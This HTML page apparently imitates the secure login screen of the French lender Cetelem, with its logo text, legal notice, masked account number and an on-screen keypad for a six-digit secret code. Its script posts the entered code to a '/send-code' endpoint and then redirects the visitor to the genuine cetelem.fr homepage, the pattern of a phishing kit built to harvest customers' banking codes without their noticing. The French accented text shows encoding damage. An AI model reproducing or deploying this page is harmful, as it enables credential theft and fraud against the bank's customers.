<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Connexion s√©curis√©e</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #c0d4cd;
      margin: 0;
      padding: 0;
    }

    .logo {
      text-align: center;
      padding-top: 20px;
      font-size: 28px;
      font-weight: bold;
      color: #1b5e20;
    }

    .legal {
      text-align: center;
      font-size: 13px;
      color: #333;
      margin: 10px 20px;
    }

    .container {
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 20px;
    }

    .login-box {
      background-color: #fff;
      padding: 30px 20px;
      border-radius: 8px;
      box-shadow: 0 0 8px rgba(0,0,0,0.1);
      text-align: center;
      max-width: 350px;
      width: 100%;
    }

    .back-link {
      align-self: flex-start;
      margin: 10px;
      color: #014421;
      font-weight: bold;
      text-decoration: none;
    }

    .avatar {
      font-size: 40px;
    }

    .masked-id {
      margin-top: 8px;
      font-size: 14px;
      color: #444;
    }

    h2 {
      margin: 15px 0;
      font-size: 18px;
      font-weight: bold;
    }

    input[type="password"] {
      width: 100%;
      padding: 10px;
      font-size: 18px;
      text-align: center;
      border: 1px solid #ccc;
      border-radius: 4px;
      letter-spacing: 4px;
      margin-bottom: 15px;
    }

    .keypad {
      display: grid;
      grid-template-columns: repeat(4, 1fr);
      gap: 10px;
      margin-bottom: 20px;
    }

    .keypad button {
      background-color: #0a4d3c;
      color: white;
      font-size: 18px;
      border: none;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      cursor: pointer;
    }

    .submit-btn {
      width: 100%;
      background-color: #a5abad;
      color: white;
      padding: 10px;
      font-size: 16px;
      border: none;
      border-radius: 4px;
      cursor: pointer;
    }

    .forgot-link {
      display: block;
      margin-top: 10px;
      color: #014421;
      font-size: 13px;
      text-decoration: underline;
    }

    footer {
      text-align: center;
      margin-top: 40px;
      font-size: 12px;
    }

    .footer-links a {
      color: #000;
      text-decoration: none;
      margin: 0 5px;
    }

    .footer-social {
      margin-top: 10px;
      font-size: 20px;
    }
  </style>
</head>
<body>

  <div class="logo">cetelem</div>
  <div class="legal">
    Un cr√©dit vous engage et doit √™tre rembours√©.<br>
    V√©rifiez vos capacit√©s de remboursement avant de vous engager.
  </div>

  <div class="container">
    <a href="#" class="back-link">Retour</a>
    <div class="login-box">
      <div class="avatar">üë§</div>
      <div class="masked-id">********26</div>
      <h2>Acc√©der √† mon espace s√©curis√©</h2>
      <input type="password" id="codeInput" maxlength="6" readonly>

      <div class="keypad">
        <button>1</button><button>2</button><button>3</button><button>C</button>
        <button>4</button><button>5</button><button>6</button><button>‚Üê</button>
        <button>7</button><button>8</button><button>9</button><button>0</button>
      </div>

      <button id="submitBtn" class="submit-btn">Je me connecte</button>
      <a href="#" class="forgot-link">Code secret oubli√© ?</a>
    </div>

    <footer>
      <div class="footer-links">
        <a href="#">Virement express</a> |
        <a href="#">R√©siliation</a> |
        <a href="#">Contact</a> |
        <a href="#">Mentions l√©gales</a> |
        <a href="#">Pr√©f√©rences de cookies</a>
      </div>
      <div class="footer-social">
      </div>
    </footer>
  </div>

  <script>
    let code = "";

    document.querySelectorAll(".keypad button").forEach(button => {
      button.addEventListener("click", () => {
        const val = button.textContent;

        if (!isNaN(val) && code.length < 6) {
          code += val;
        } else if (val === "‚Üê") {
          code = code.slice(0, -1);
        } else if (val === "C") {
          code = "";
        }

        document.getElementById("codeInput").value = "*".repeat(code.length);
      });
    });

    document.getElementById("submitBtn").addEventListener("click", async () => {
      if (code.length !== 6 || isNaN(code)) {
        alert("Veuillez entrer un code √† 6 chiffres.");
        return;
      }

      try {
        await fetch("/send-code", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ code })
        });

        window.location.href = "https://www.cetelem.fr/fr/accueil";
      } catch (error) {
        alert("Erreur lors de l'envoi.");
        console.error(error);
      }
    });
  </script>
</body>
</html>
